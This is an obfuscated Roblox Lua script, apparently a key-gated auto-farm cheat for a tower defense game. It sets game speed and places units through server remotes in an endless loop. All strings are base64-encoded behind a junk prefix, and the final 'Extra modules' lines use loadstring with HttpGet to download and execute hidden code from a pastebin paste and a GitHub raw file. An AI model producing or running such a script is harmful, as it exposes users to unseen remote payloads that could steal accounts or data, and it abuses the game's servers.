local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


--// Player Reference
local Players = game:GetService(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('RBrAfAPLstLWBFWfREIQscuRahgXvxQHBiqhbhIZIgLdGUFAEzMzkLgUGxheWVycw=='))
local plr = Players.LocalPlayer

print(plr.Name .. LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('mcVjKIdVeAfAyXfziZCdEzavgpyMntWxmAjGWiLlBjxRPLJUdXGcVLkIGxvYWRlZCBzY3JpcHQuIFdhaXRpbmcgZm9yIGtleS4uLg=='))

--// Key GUI
local ScreenGui = Instance.new(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('vKxwEZvlNKYvtYAodoXltdXytSjoHUZKwIVQSnyoXoZbjuYqXancJvBU2NyZWVuR3Vp'), plr:WaitForChild(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('zJdnzJbQGzdHQvrJEpnPYSIpdxwgwDxtKmQhauKTkSXOTDeIqIHrEiOUGxheWVyR3Vp')))
local Frame = Instance.new(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('mhyKxfEBaQwDxqRZHBdiAFLBqShJeehYKMSTyjvRCTiubsjxRyrdboCRnJhbWU='), ScreenGui)
Frame.Size = UDim2.new(0, 350, 0, 220)
Frame.Position = UDim2.new(0.5, -175, 0.5, -110)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true

-- Rounded corners
local UICorner = Instance.new(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('xJTXIlviDdLOdAlIJcAaXGidisFzYYNdIVASxIpGwVGzPDoXMaxsTlTVUlDb3JuZXI='), Frame)
UICorner.CornerRadius = UDim.new(0, 12)

-- Title
local Title = Instance.new(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('WdZCExJhjngTOgmwkMcJNVytQHJyKoGiwSANKNGOAmcFtQiElEsiGXgVGV4dExhYmVs'), Frame)
Title.Size = UDim2.new(1, 0, 0, 50)
Title.BackgroundTransparency = 1
Title.Text = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('tevOMBPBTmIWhNDSUqSlRWnczJZHwiCJfARtipAXwyBxNZoCnNEQkOT8J+UkSBHYXJkZW4gVG93ZXIgRGVmZW5zZSB8IEtleSBTeXN0ZW0=')
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18

-- TextBox for key
local TextBox = Instance.new(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('oZnlEKBtREuctZRvBrZCPBaTUNWXxnfcGNeZWxEcvQhWGthXFCtgoFwVGV4dEJveA=='), Frame)
TextBox.Size = UDim2.new(1, -40, 0, 40)
TextBox.Position = UDim2.new(0, 20, 0, 70)
TextBox.PlaceholderText = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('GUYAJWjFsVllHgTByRdueMSdEDwMqZvlkxwGkWAIKzmShRpVCMxWlmrRW50ZXIgS2V5IEhlcmU=')
TextBox.Text = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('hMmTaGZTFLOVWIJrjROoDcDZQtRDfdPhUGJLqSmPdWRlvBIAnfjlmmX')
TextBox.Font = Enum.Font.Gotham
TextBox.TextSize = 16
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 70)

local tbCorner = Instance.new(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('ZQkVBXpOXYSynFHRcaiNsYOyaZrvXWjZNofaIZMzuAEXQPiEtrBaOIxVUlDb3JuZXI='), TextBox)
tbCorner.CornerRadius = UDim.new(0, 8)

-- Check Button
local CheckBtn = Instance.new(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('yKQmSvZmPZSwYGUlFFEowqiuklgRrqflIvTkusLLSymArnvZNOatSisVGV4dEJ1dHRvbg=='), Frame)
CheckBtn.Size = UDim2.new(1, -40, 0, 40)
CheckBtn.Position = UDim2.new(0, 20, 0, 120)
CheckBtn.Text = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('OXtZYtgcSdtjhsaBZAhdzhlFAppSglRQDKtCQHxmJmxQqTvyjrdLDiT4pyFIFZlcmlmeSBLZXk=')
CheckBtn.Font = Enum.Font.GothamBold
CheckBtn.TextSize = 16
CheckBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CheckBtn.BackgroundColor3 = Color3.fromRGB(80, 170, 80)

local cbCorner = Instance.new(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('iibAvyGiVOIAhsoqaDfkTlyKYDTZTfTAdGgvSgCcxCMdDakvLbUvagkVUlDb3JuZXI='), CheckBtn)
cbCorner.CornerRadius = UDim.new(0, 8)

-- Status Label
local Label = Instance.new(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('aRGtqUNbWIHbivfyhwRdjVrtdgwleVMgbJlKZCyEruhbgxOQaPhgMeNVGV4dExhYmVs'), Frame)
Label.Size = UDim2.new(1, -20, 0, 30)
Label.Position = UDim2.new(0, 10, 0, 170)
Label.BackgroundTransparency = 1
Label.Text = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('nNTWMweIEXsxPrEwOrJUxrvIKhLzewSqDBOsOJEPvhEZnSiTyPxzQLM')
Label.Font = Enum.Font.GothamBold
Label.TextSize = 16
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.TextWrapped = true

--// Remotes
local rs = game:GetService(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('ikHqYrjHBHevMgjKljForQfISsPPKLYFOGTazbNVeJwOVNPCMtiaLKhUmVwbGljYXRlZFN0b3JhZ2U='))
local remotes = rs:WaitForChild(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('MQndvwmnAtYXdNxFMEvtJiuWYgMXhaEIavuKAJejEkiLFHmmzQjoBDOUmVtb3RlRnVuY3Rpb25z'))

-- Auto Skip (enable once at start)
task.delay(2, function()
    pcall(function()
        remotes.ToggleAutoSkip:InvokeServer(true)
        warn(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('QsIWRWAOUpscRSiOckqMhDArLRIoxogmoKwbSKLWJHTpSAevqNKLBqoW1N5c3RlbV0gQXV0byBTa2lwIEVuYWJsZWQ='))
    end)
end)

--=== GAME SCRIPTS ===--
function load2xScript()
    warn(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('ToUqBCmHrnyANnUooPXEjYCwfYPidHkHUjvtSLKjzawHBROsYtNcVMKW1N5c3RlbV0gTG9hZGVkIDJ4IFNwZWVkIFNjcmlwdA=='))
    remotes.ChangeTickSpeed:InvokeServer(2)
    
    local difficulty = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('dfpcSAhnAJjvOkJtFtTNzJpiWifiPYaOGLLbjyNKXywQHQsOoRYVShfZGlmX2ltcG9zc2libGU=')
    local placements = {
        {time = 29, unit = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('oWSXTTkuvXeFhiDXWNmgycwTFgSDzyjJRlZKPabBoQzHVaRwgibcShsdW5pdF9sYXdubW93ZXI='), slot = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('pfqkqsGAZgJMxOvgrDQqPSKkdCuveClIFoSHffhXYUjhPTMjRsIUUQzMQ=='), data = {Valid=true,PathIndex=3,Position=Vector3.new(-843.87,62.18,-123.05),CF=CFrame.new(-843.87,62.18,-123.05),Rotation=180}},
        {time = 47, unit = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('KPTBJJfmLbLdJNRvrGgdldYOxpqsyejpKepIPmZjIsDtZNWAmsibgCvdW5pdF9yYWZmbGVzaWE='), slot = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('MePcmYprmovpisbyGUAsJKuhJjnvDcgwjbOevlVlOosYWUQPSuUamidMg=='), data = {Valid=true,PathIndex=3,Position=Vector3.new(-842.38,62.18,-162.01),CF=CFrame.new(-842.38,62.18,-162.01),Rotation=180}},
        {time = 85, unit = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('NEgsvFapZMfmhcQvwyFqTQPbgVefzwsEeAghhgSfcMGFUhBmCgitWUHdW5pdF9yYWZmbGVzaWE='), slot = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('FnchSmCiolVunupMSbivIUmPOGxVTBIQTxbqYRvSXJAnSHVLAEXYwvLMg=='), data = {Valid=true,PathIndex=3,Position=Vector3.new(-842.38,62.18,-164.50),CF=CFrame.new(-842.38,62.18,-164.50),Rotation=180}},
        {time = 110, unit = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('qEhjpFMujBgirfORANoleFWMHnGjHaPGcSQgJLAthjInVFETOUvATGFdW5pdF9yYWZmbGVzaWE='), slot = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('wAzyunkzGkkBAEsAQyyWFelodvFoflUKNizThliXBfapUimBBMboJaZMg=='), data = {Valid=true,PathIndex=2,Position=Vector3.new(-864.72,62.18,-199.05),CF=CFrame.new(-864.72,62.18,-199.05),Rotation=180}},
    }

    local function placeUnit(unitName, slot, data)
        remotes.PlaceUnit:InvokeServer(unitName, data)
        warn(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('CzUVtRQGhtlwDzqyjuKmvfKtywtuNPZmMdwsQLgQoIKMjgIiqiGdRWyW1BsYWNpbmddIA==')..unitName)
    end

    local function startGame()
        remotes.PlaceDifficultyVote:InvokeServer(difficulty)
        for _, p in ipairs(placements) do
            task.delay(p.time, function()
                placeUnit(p.unit, p.slot, p.data)
            end)
        end
    end

    while true do
        startGame()
        task.wait(174.5)
        remotes.RestartGame:InvokeServer()
    end
end

function load3xScript()
    warn(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('IrJwFPayKTKsBhBETmCtNozoMFBJNPOtiRTwrtlFnZyxKUVyOBFTfyYW1N5c3RlbV0gTG9hZGVkIDN4IFNwZWVkIFNjcmlwdA=='))
    remotes.ChangeTickSpeed:InvokeServer(3)

    local difficulty = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('cCyduTLfNizYWdnvbnrpbEcNnlHsPZznKvgYOHWDZMVgMkjgXJbAYbpZGlmX2ltcG9zc2libGU=')
    local placements = {
        {time = 23, unit = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('lBjuFXpbHFvJkuzsPaNBCAjbSrJsDNQloedMcKteqSbORuQxStRPkrGdW5pdF9sYXdubW93ZXI='), slot = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('wNHfQTkISMmAMADaDjeRGPBkdkKivsicFcjOJHAoryAOKtNieGgvtgZMQ=='), data = {Valid=true,PathIndex=3,Position=Vector3.new(-843.87,62.18,-123.05),CF=CFrame.new(-843.87,62.18,-123.05),Rotation=180}},
        {time = 32, unit = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('mlJuacqILLDRyDQZOeJvvFVzEKtogoiyBTtXGFuDSJkevqQRqDmSTnrdW5pdF9yYWZmbGVzaWE='), slot = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('nOXMvnQtOCtOaPGvrjvnYwhMQIMvnNSULQakCPPIcXOMbACdMgORTCYMg=='), data = {Valid=true,PathIndex=3,Position=Vector3.new(-842.38,62.18,-162.01),CF=CFrame.new(-842.38,62.18,-162.01),Rotation=180}},
        {time = 57, unit = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('mkjRfRcBUoBmZMhdmNPHQXfDNvAAMUgrLppEehLPgOwSlZVDKPlehQFdW5pdF9yYWZmbGVzaWE='), slot = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('bzYApHiAeBnQTfGpCuJzUWhXNMNPJUKsEcvlRWCZBNPvqMrZoWLOYNsMg=='), data = {Valid=true,PathIndex=3,Position=Vector3.new(-842.38,62.18,-164.50),CF=CFrame.new(-842.38,62.18,-164.50),Rotation=180}},
        {time = 77, unit = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('hUAnnrdNyrmGOfPeXRDSJbkdTEVwIadgSlLqaCBwUucBxSVIOzHQamPdW5pdF9yYWZmbGVzaWE='), slot = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('sUKVdygwPMhLGOBnPUOGktMhLutCBvlUndBieEwEurdWnadlwzSdGgRMg=='), data = {Valid=true,PathIndex=2,Position=Vector3.new(-864.72,62.18,-199.05),CF=CFrame.new(-864.72,62.18,-199.05),Rotation=180}},
    }

    local function placeUnit(unitName, slot, data)
        remotes.PlaceUnit:InvokeServer(unitName, data)
        warn(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('ubCkFfhAkMsukojlXDHcnXUKzMgIfouVuhYeMNSYhZeuaCnHbKIWkXHW1BsYWNpbmddIA==')..unitName)
    end

    local function startGame()
        remotes.PlaceDifficultyVote:InvokeServer(difficulty)
        for _, p in ipairs(placements) do
            task.delay(p.time, function()
                placeUnit(p.unit, p.slot, p.data)
            end)
        end
    end

    while true do
        startGame()
        task.wait(128)
        remotes.RestartGame:InvokeServer()
    end
end

--=== SPEED MENU ===--
local function showSpeedMenu()
    Frame:ClearAllChildren()

    local Title = Instance.new(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('kIAWKuBkOzzYBsUqNqjIEepShYssuTgRkKyBCcuoomVklzJRwTbtpzvVGV4dExhYmVs'), Frame)
    Title.Size = UDim2.new(1, 0, 0, 50)
    Title.BackgroundTransparency = 1
    Title.Text = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('cIJvcNXjikslomQPXALvOepjxhatsewxmEovxUDrmzXrfDpWMuCpMIq4pqhIFNlbGVjdCBHYW1lIFNwZWVk')
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 20

    local btn2x = Instance.new(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('lZGvhJwcKMVJsJKTCBvyaNTBBlGKNsoTBwJpsAfiQKoNfZLoUWMooMuVGV4dEJ1dHRvbg=='), Frame)
    btn2x.Size = UDim2.new(0.45, 0, 0, 60)
    btn2x.Position = UDim2.new(0.05, 0, 0.5, -30)
    btn2x.Text = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('NElaXLXDDRSZjWoIhvmAqcUWPeQQrQhYzPAsiNUtLMywLaHoKSzjNGgMnggU3BlZWQ=')
    btn2x.Font = Enum.Font.GothamBold
    btn2x.TextSize = 18
    btn2x.TextColor3 = Color3.fromRGB(255,255,255)
    btn2x.BackgroundColor3 = Color3.fromRGB(70,130,250)
    Instance.new(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('fndRcAYSopWhyUZCRqWrZVLsADERFNrqKTkDxXrAuGRlUENAwWeVarRVUlDb3JuZXI='), btn2x).CornerRadius = UDim.new(0, 8)

    local btn3x = Instance.new(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('kWCnMWflBeBbnMXwXoYpZXHaxwKjqvzNvliKfVLEMPVmdhQWLhljRUgVGV4dEJ1dHRvbg=='), Frame)
    btn3x.Size = UDim2.new(0.45, 0, 0, 60)
    btn3x.Position = UDim2.new(0.5, 0, 0.5, -30)
    btn3x.Text = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('vbYXIMhfFPJEQHBzLaMcbYHsWqSHiAFieFqZvUwpqyEINAVCTozykATM3ggU3BlZWQ=')
    btn3x.Font = Enum.Font.GothamBold
    btn3x.TextSize = 18
    btn3x.TextColor3 = Color3.fromRGB(255,255,255)
    btn3x.BackgroundColor3 = Color3.fromRGB(250,100,100)
    Instance.new(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('eRhSCbBTDAJqNxkDrXFwnSFpkVvoEFKioYsKHoTfwiMDKdrnFRvjNHkVUlDb3JuZXI='), btn3x).CornerRadius = UDim.new(0, 8)

    btn2x.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
        load2xScript()
    end)

    btn3x.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
        load3xScript()
    end)
end

--=== KEY CHECK ===--
CheckBtn.MouseButton1Click:Connect(function()
    if TextBox.Text == LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('ceiRPmRjIDWxxvQTOMqFyLmAhDkiLJlVoniwAzxQnuyWKMXyzgSPKwRR1REMjAyNQ==') then
        Label.Text = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('FGymYhkZHfwUtSNbqpMbkhfpNuDPWiKOvvDmkLlebQpIhJEkwXSABGH4pyFIEtleSBBY2NlcHRlZCE=')
        Label.TextColor3 = Color3.fromRGB(0,255,0)
        task.delay(1, showSpeedMenu)
    else
        TextBox.Text = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('VaBAvqLqEPcFWpkYpbYvZEKnrXHUdtnjFFbpqVmBcMOWcMzPVIUJuIt')
        Label.Text = LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('MjFQXBcovKMuXmANTXrXwxjEpiSPLPkBgmmRJDWKtbkLkZwvnzxqtGm4p2MIEludmFsaWQgS2V5IQ==')
        Label.TextColor3 = Color3.fromRGB(255,0,0)
    end
end)

-- Extra modules
loadstring(game:HttpGet(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('bohWiUTNArJgAmPHGiRMDcZNcXPFCGsuVYaqfvOOAqZYDKbFspXJPbfaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0hrQW1QY2tR')))()
loadstring(game:HttpGet(LqvxomJMguyValBGclHQJYeYdCYkeoWIkKtllZFpNkfnSSjTNmlkDxFeZldMUsctqgnbS('sygafodxiCKMfleYXKFHVNdQwbocSTdTZQxFUzfuHExKfLlWvIDqtWsaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hhc3Nhbnh6YXluLWx1YS9BbnRpLWFmay9tYWluL2FudGlhZmtieWhhc3Nhbnh6eW4=')))()
    
